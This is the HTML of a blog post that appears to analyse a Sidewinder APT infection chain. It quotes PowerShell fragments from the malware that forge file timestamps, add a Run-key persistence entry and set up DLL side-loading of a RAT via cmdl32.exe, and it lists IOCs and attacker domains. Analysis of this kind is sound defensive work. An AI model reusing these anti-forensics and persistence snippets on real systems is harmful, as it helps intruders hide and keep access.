67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*gskxEMV2wHIwHkcKEQu-NQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*gskxEMV2wHIwHkcKEQu-NQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*gskxEMV2wHIwHkcKEQu-NQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*gskxEMV2wHIwHkcKEQu-NQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*gskxEMV2wHIwHkcKEQu-NQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*gskxEMV2wHIwHkcKEQu-NQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*gskxEMV2wHIwHkcKEQu-NQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lk oz c" width="700" height="390" loading="lazy" role="presentation"/></picture></div></div></figure><p id="48ef" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">In fact:</p><p id="a0e4" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">The powershell modify the dll to add $lines</p><p id="32ff" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">and $lines</p><blockquote class="pd pe pf"><p id="45f6" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$line = new-object byte[] 64;<br/>$buf6 =[Byte[]] (,0x23 * 64);<br/>$cbytes = [system.Text.Encoding]::ASCII.GetBytes($cmdLine);<br/>[array]::copy($cbytes,$line,$cbytes.length);</p></blockquote><p id="8e83" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">and $cmdLine</p><blockquote class="pd pe pf"><p id="642b" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$bin =Winset.exe</p><p id="175a" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$cmdLine = ([int]$c).toString(“00000000”)+([int]$m).toString(“00000000”);<br/>$cmdLine = $bin+ “ “ +$cmdLine;<br/>}</p></blockquote><p id="28ce" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">like in the dll: .string “Winset.exe -0000000100001223</p><p id="924e" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">So we have in the same folder: Winset\Config</p><ul class=""><li id="ccf4" class="nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og pj pk pl bk">Winset.exe (part1 modified and decoded)is a fake Windows Security Configuration Editor Command Tool</li><li id="170f" class="nj nk gu nl b nm pm no np nq pn ns nt nu po nw nx ny pp oa ob oc pq oe of og pj pk pl bk">cmpbk32.dll (part2 modified and decoded)</li><li id="9727" class="nj nk gu nl b nm pm no np nq pn ns nt nu po nw nx ny pp oa ob oc pq oe of og pj pk pl bk">57146C96.dll (vb virtual machine)</li><li id="423f" class="nj nk gu nl b nm pm no np nq pn ns nt nu po nw nx ny pp oa ob oc pq oe of og pj pk pl bk">cmdl32.exe (executable of windows)</li></ul><p id="e1ff" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">The powershell change timestamps of files copied:</p><blockquote class="pd pe pf"><p id="a795" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">updt -t $binPathdll -b $cmdl32path</p><p id="84da" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">updt -t $binPath -b $cmdl32path</p><p id="1537" class="nj nk pg nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">function updt($t, $b){<br/> (ls $t).LastWriteTime = (ls $b).LastWriteTime<br/> (ls $t).CreationTime = (ls $b).CreationTime<br/> (ls $t).LastAccessTime = (ls $b).LastAccessTime<br/>}</p></blockquote><h1 id="4f4a" class="md me gu bf mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na bk">Persistance</h1><p id="2a4d" class="pw-post-body-paragraph nj nk gu nl b nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og gn bk">The persistant is a hkey run very basic with the path of the dll in parameter:</p><p id="2963" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">$run = ‘HKCU:Software\Microsoft\Windows\CurrentVersion\Run\’;</p><p id="9dd6" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">New-ItemProperty -Path $run -Name “Winsound” -PropertyType String -Value $dmybinPath | Out-Null;</p><p id="09a4" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">To reload cmpbk32.dll at each reboot of the system and execute the dllmain of the dll.</p><h1 id="d509" class="md me gu bf mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na bk">Loading Chain</h1><p id="ce69" class="pw-post-body-paragraph nj nk gu nl b nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og gn bk">The powershell launch cmdl32.exe (“Connection Manager Phonebook Downloader”) trusted by AV because it’s develloped by Microsoft.</p><p id="8812" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">this exe used: cmpbk32.dll</p><figure class="op oq or os ot ou om on paragraph-image"><div class="om on pr"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 1100w, https://miro.medium.com/v2/resize:fit:1268/format:webp/1*NyF5UD6MIWldtbpEr3y5IQ.png 1268w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 634px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*NyF5UD6MIWldtbpEr3y5IQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*NyF5UD6MIWldtbpEr3y5IQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*NyF5UD6MIWldtbpEr3y5IQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*NyF5UD6MIWldtbpEr3y5IQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*NyF5UD6MIWldtbpEr3y5IQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*NyF5UD6MIWldtbpEr3y5IQ.png 1100w, https://miro.medium.com/v2/resize:fit:1268/1*NyF5UD6MIWldtbpEr3y5IQ.png 1268w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 634px"/><img alt="" class="bh lk oz c" width="634" height="162" loading="lazy" role="presentation"/></picture></div></figure><p id="f4e3" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">So when cmdl32.exe is launched cmpbk32.dll is loaded. (in the same directory, side loading)</p><p id="18a6" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">the entrypoint is exectuted.</p></div></div><div class="ou"><div class="ab cb"><div class="lf ps lg pt lh pu cf pv cg pw ci bh"><figure class="op oq or os ot ou py pz paragraph-image"><div role="button" tabindex="0" class="ov ow fj ox bh oy"><div class="om on px"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*fQ8cDP8CRj8EmmzfKMnXRw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*fQ8cDP8CRj8EmmzfKMnXRw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*fQ8cDP8CRj8EmmzfKMnXRw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*fQ8cDP8CRj8EmmzfKMnXRw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*fQ8cDP8CRj8EmmzfKMnXRw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*fQ8cDP8CRj8EmmzfKMnXRw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*fQ8cDP8CRj8EmmzfKMnXRw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*fQ8cDP8CRj8EmmzfKMnXRw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh lk oz c" width="1000" height="769" loading="eager" role="presentation"/></picture></div></div></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><p id="cce4" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">The important part is:</p><figure class="op oq or os ot ou om on paragraph-image"><div role="button" tabindex="0" class="ov ow fj ox bh oy"><div class="om on qa"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eSBQqIXyF-U2Qq51FYXsMg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*eSBQqIXyF-U2Qq51FYXsMg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*eSBQqIXyF-U2Qq51FYXsMg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*eSBQqIXyF-U2Qq51FYXsMg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*eSBQqIXyF-U2Qq51FYXsMg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*eSBQqIXyF-U2Qq51FYXsMg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*eSBQqIXyF-U2Qq51FYXsMg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*eSBQqIXyF-U2Qq51FYXsMg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lk oz c" width="700" height="168" loading="eager" role="presentation"/></picture></div></div></figure><p id="1fc1" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">The function sub.Winset.exe__0000000100001223_0 launches Winset.exe the real RAT like this “Winset.exe -0000000100001223” ; len=2</p></div></div></div><div class="ab cb qb qc qd qe" role="separator"><span class="qf by bm qg qh qi"></span><span class="qf by bm qg qh qi"></span><span class="qf by bm qg qh"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><figure class="op oq or os ot ou om on paragraph-image"><div role="button" tabindex="0" class="ov ow fj ox bh oy"><div class="om on qj"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cyKfNUGcZs3qFmxqlZYEww.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*cyKfNUGcZs3qFmxqlZYEww.png 640w, https://miro.medium.com/v2/resize:fit:720/1*cyKfNUGcZs3qFmxqlZYEww.png 720w, https://miro.medium.com/v2/resize:fit:750/1*cyKfNUGcZs3qFmxqlZYEww.png 750w, https://miro.medium.com/v2/resize:fit:786/1*cyKfNUGcZs3qFmxqlZYEww.png 786w, https://miro.medium.com/v2/resize:fit:828/1*cyKfNUGcZs3qFmxqlZYEww.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*cyKfNUGcZs3qFmxqlZYEww.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*cyKfNUGcZs3qFmxqlZYEww.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lk oz c" width="700" height="364" loading="eager" role="presentation"/></picture></div></div></figure><p id="5f0d" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">Winset.exe is RAT developed in VB6.</p><p id="0754" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">You can find an complete analysis here: <a class="af io" href="https://s.tencent.com/research/report/479.html" rel="noopener ugc nofollow" target="_blank">https://s.tencent.com/research/report/479.html</a></p><h1 id="9fab" class="md me gu bf mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na bk">Threat Intelligence</h1><p id="0e1b" class="pw-post-body-paragraph nj nk gu nl b nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og gn bk">We have the TTPs described in Tencent with the same phases.</p><p id="5363" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">Sidewinder is a Indian Group targeting Pakistan military infrastructure.</p><p id="0430" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">The content of the RTF is cleary oriented to Navy Pakistani.</p><p id="fdad" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">If we check the infrastructure of the attackers:</p><figure class="op oq or os ot ou om on paragraph-image"><div role="button" tabindex="0" class="ov ow fj ox bh oy"><div class="om on qk"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UNB3nsU-2fey_uCyR0BC4w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*UNB3nsU-2fey_uCyR0BC4w.png 640w, https://miro.medium.com/v2/resize:fit:720/1*UNB3nsU-2fey_uCyR0BC4w.png 720w, https://miro.medium.com/v2/resize:fit:750/1*UNB3nsU-2fey_uCyR0BC4w.png 750w, https://miro.medium.com/v2/resize:fit:786/1*UNB3nsU-2fey_uCyR0BC4w.png 786w, https://miro.medium.com/v2/resize:fit:828/1*UNB3nsU-2fey_uCyR0BC4w.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*UNB3nsU-2fey_uCyR0BC4w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*UNB3nsU-2fey_uCyR0BC4w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lk oz c" width="700" height="721" loading="lazy" role="presentation"/></picture></div></div></figure><p id="366b" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">We have <a class="af io" href="http://www.nadra.gov.pk.d-dns.co" rel="noopener ugc nofollow" target="_blank">www.nadra.gov.pk.d-dns.co</a> cleary targetted.</p><p id="9348" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">The nadra is the National Database of and Registration Authority.</p><p id="8c1a" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">If you check the metada of RTF, Rashid Memorial is the author of the document.</p><p id="3030" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">This name is really known by the navy pakistani because “Rashid Memorial Welfare Organization (RMWO) was set up by a group of dedicated retired PAF officers in 1998 in memory of Flt. Lt. Rashid Ahmed Khan, who embraced ‘Shahadat’ on 13th December, 1997 when his aircraft caught fire above a densely populated area.”</p><h1 id="b8d4" class="md me gu bf mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na bk">IOCs</h1><p id="0510" class="pw-post-body-paragraph nj nk gu nl b nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og gn bk">File RTF:</p><p id="43cc" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488</p><p id="d710" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">08b9b5b7592004b8733544df1029e2fc085d82db1ba488a43830df49bbbc73b6</p><p id="e810" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">hta:</p><p id="18d8" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">b8cbdb36ccd666adaf2ba3628cc79578d3a05119c71dce1bb16aa39e56dea3cc</p><p id="3cfe" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">Executables:</p><p id="5ec7" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">8315956b587032db14ba4e700400dffeaeb4119ef509ecf0df1bb4e80a496b59 (cmpbk32.dll)</p><p id="841f" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">13497aab3521abbaa654b51f375114e419b1bb774caa8c67cf52775095b17423 (winset.exe)</p><p id="3b71" class="pw-post-body-paragraph nj nk gu nl b nm oh no np nq oi ns nt nu oj nw nx ny ok oa ob oc ol oe of og gn bk">Sandbox execution:</p><div class="ql qm qn qo qp qq"><a href="https://app.any.run/tasks/779ba068-a9d5-490b-a1ec-7ebaa81e5d57?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qr ab ip"><div class="qs ab co cb qt qu"><h2 class="bf gv ij z qv qw qx qy qz ra rb gt bk">892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488.rtf (MD5…</h2><div class="rc l"><h3 class="bf b ij z qv qw qx qy qz ra rb du">Interactive malware hunting service. Any environments ready for live testing most type of threats. Without install…</h3></div><div class="rd l"><p class="bf b dv z qv qw qx qy qz ra rb du">app.any.run</p></div></div><div class="re l"><div class="rf l rg rh ri re rj lk qq"></div></div></div></a></div><h1 id="e047" class="md me gu bf mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na bk">Credits:</h1><p id="054f" class="pw-post-body-paragraph nj nk gu nl b nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og gn bk">Thanks to Benjamin Piot for exchange about this cases !</p></div></div></div></div></section></div></div></article></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="rk rl ab is"><div class="rc ab"><a class="rm ay am ao" href="https://medium.com/tag/threat-intelligence?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><div class="rn fj cx ro ge rp rq bf b bg z bk rr">Threat Intelligence</div></a></div><div class="rc ab"><a class="rm ay am ao" href="https://medium.com/tag/malware-analysis?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><div class="rn fj cx ro ge rp rq bf b bg z bk rr">Malware Analysis</div></a></div></div></div></div><div class="l"></div><footer class="rs rt ru rv rw ab q rx ry c"><div class="l ae"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab cp rz"><div class="ab q kb"><div class="sa l"><span class="l sb sc sd e d"><div class="ab q kb kc"><div class="pw-multi-vote-icon fj kd ke kf kg"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F5bc1a7e7c84c&amp;operation=register&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;user=Sebdraven&amp;userId=11d98531eebe&amp;source=---footer_actions--5bc1a7e7c84c---------------------clap_footer------------------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="kh ao ki kj kk kl am km kn ko kg"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 